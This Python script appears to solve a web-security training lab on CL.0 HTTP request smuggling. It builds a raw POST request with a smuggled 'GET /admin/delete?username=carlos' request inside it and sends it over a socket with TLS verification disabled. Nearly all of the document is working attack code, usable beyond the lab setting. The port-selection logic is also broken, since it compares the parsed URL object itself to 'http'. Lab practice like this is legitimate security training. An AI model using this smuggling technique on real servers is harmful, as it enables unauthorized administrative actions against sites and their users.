# CL.0 request smuggling

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import socket
import ssl

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def build_request(url, session):
	request_body = """GET /admin/delete?username=carlos HTTP/1.1\r\nFoo: x"""
	
	request_content = 'POST /resources/images/blog.svg HTTP/1.1\r\n'
	request_content += 'Host: ' + url + '\r\n'
	request_content += f'Cookie: session={session}\r\n'
	request_content += 'Connection: keep-alive\r\n'
	request_content += 'Content-Length: ' + str(len(request_body)) + '\r\n'
	request_content += '\r\n'
	request_content += request_body
	print("------------------------------------------------------")
	print(request_content)
	print("------------------------------------------------------")
	return request_content

def send_smuggling(request_content, host, port):
	context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
	context.check_hostname = False
	context.verify_mode = ssl.CERT_NONE
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock = context.wrap_socket(sock, server_hostname=host)
	sock.connect((host, port))
	sock.sendall(request_content.encode())
	sock.close()

def main():
	print('[+] Lab: CL.0 request smuggling')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print('[+] Usage: %s <URL>' % sys.argv[0])
		sys.exit(-1)
	s = requests.Session()
	s.proxies = proxies
	s.verify = False
	r = s.get(url, allow_redirects=False)
	time.sleep(1)
	if '<h1>Error</h1>' in r.text:
		print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
		sys.exit(-1)
	else:
		print('[+] Trying send HTTP Request Smuggling attack...\n')
		time.sleep(1)
		parsed_url = urllib.parse.urlparse(url)
		subdomain = parsed_url.netloc
		if parsed_url.port:
			port = parsed_url.port
		elif parsed_url.scheme == "https":
			port = 443
		elif parsed_url == "http":
			port = 80
		session = r.cookies.get('session')
		request_content = build_request(subdomain, session)
		print(parsed_url)
		send_smuggling(request_content, subdomain, port)
		r = requests.get(url, verify=False, proxies=proxies)
		print(r)
		if r.status_code == 403 or r.status_code == 401:
			print(r.text)
			print('[+] The lab should be solved !')

if __name__ == "__main__":
	main()
